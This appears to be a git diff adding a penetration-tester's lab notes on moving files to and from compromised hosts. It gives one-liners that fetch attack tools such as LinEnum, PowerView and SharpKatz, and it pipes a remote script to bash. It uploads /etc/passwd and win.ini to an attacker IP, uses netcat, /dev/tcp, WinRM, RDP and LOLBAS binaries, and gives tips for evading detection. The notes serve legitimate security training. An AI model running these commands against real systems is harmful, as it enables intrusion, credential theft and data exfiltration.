@@ -294,3 +294,235 @@ There are many ways to start a web server in multiple programming languages:
 - Python2: `python2.7 -m SimpleHTTPServer`
 - PHP: `php -S 0.0.0.0:8000`
 - Ruby: `ruby -run -ehttpd . -p8000`
+
+## Transfer files with code
+
+So far, we have seen ways of moving files using existing tools. However, we can leverage the use of programming languges to transfer data as well.
+
+- Python 2.7:
+```bash
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+- Python3:
+```bash
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+- PHP:
+```bash
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+```
+
+Using fopen:
+```bash
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+
+Download the file and execute it directly
+```bash
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+- Ruby:
+```bash
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+
+- Perl:
+```bash
+adriangalera@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+
+- Javascript (for Windows):
+
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+Save it as `wget.js`
+
+```ps1
+C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+
+- Visual Basic (VBScript)
+
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+
+Save it as `wget.vbs` and use it:
+
+```ps1
+C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+We can use any programming language to perform upload operations, for example Python:
+
+```bash
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+## Other transfers
+
+### Netcat (nc)
+
+Victim machine:
+```ps1
+nc -l -p 8000 > SharpKatz.exe
+```
+
+Attacker machine:
+```bash
+adriangalera@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+adriangalera@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+```
+
+There might be variations of the commands to use depending if the binary is `nc` or `ncat`.
+
+Additionally, we can have nc + /dev/tcp combination:
+
+```bash
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+
+This will download to the IP, download file and save it as `SharpKatz.exe`.
+
+### WinRM
+
+WinRM is some sort of SSH for Windows.
+
+To start, confirm the connection can be executed with WinRM:
+
+```ps1
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+```
+
+Now, we'll define a session variable that we can reuse:
+
+```ps1
+$Session = New-PSSession -ComputerName DATABASE01
+```
+
+Copy from attacker to victim:
+
+```ps1
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+Copy from victim to attacker:
+
+```ps1
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+### RDP
+
+Use copy-paste in the Remote Desktop Protocol (RDP).
+
+If copy-past do not work, we can mount a disk using RDP.
+
+```bash
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+
+Later, when we use the remote desktop, we can reach the shared disk in `\\tsclient\`.
+
+For Windows, we can use the application mstsc.exe remote desktop client.
+
+## Protect file transfers
+
+Specially when dealing with sensitive data, it is recommended to encrypt the data before the transfer.
+
+In Windows, we can use https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1 to encrypt the files with AES.
+
+```ps1
+PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
+PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+
+File encrypted to C:\htb\scan-results.txt.aes
+```
+
+In Linux, we can use `openssl` to encrypt the data:
+
+```bash
+adriangalera@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+```
+
+and decrypt it in the other side:
+
+```bash
+adriangalera@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
+```
+
+## Living off the land
+
+Some binary programs can be used to perform more tasks than intended. Some of these tasks are:
+
+- Download
+- Upload
+- Command Execution
+- File R/W
+- Bypass
+
+We can check if the binaries we have access can be used to do download or upload operations in the following websites:
+
+- https://lolbas-project.github.io/ for Windows
+- https://gtfobins.github.io/ for Linux
+
+For example, we can use `certreq.exe` to upload files:
+
+```ps1
+C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
+```
+
+Or another example, we can use `openssl` to serve files:
+
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+
+And download it in the other side:
+
+```bash
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+
+## Detection
+
+Usually there are mechanism to prevent this kind of file transfer. Most common tools to perform file transfer reveals known `User-Agents`.
+
+In order to avoid detection, a good idea might be to change the user agent of the tool used (if possible).
+
+Additionally, the mere execution of a blacklisted binary, might trigger some alarms.
+
+We can use GTFOBins or LOLBas to find binaries that will do the thing we need and are not blacklisted.
